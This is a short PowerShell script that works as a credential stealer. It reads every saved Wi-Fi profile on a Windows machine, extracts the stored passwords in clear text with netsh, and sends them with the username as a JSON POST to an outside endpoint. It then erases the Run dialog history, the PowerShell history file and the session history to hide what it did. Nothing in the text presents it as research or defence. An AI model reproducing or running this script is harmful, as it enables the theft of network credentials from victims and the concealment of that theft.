$content = ((netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); ($details=netsh wlan show profile name="$name" key=clear); [PSCustomObject]@{PROFILE_NAME=$name;PASSWORD=$details}} | Format-Table -AutoSize) | Out-String
$content = echo $content 
Invoke-RestMethod -Uri $uri -Method Post -ContentType 'Application/Json'-Body (@{'username'=$env:USERNAME;'content'=$content} | ConvertTo-Json)

reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f 
Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue
Clear-History
exit
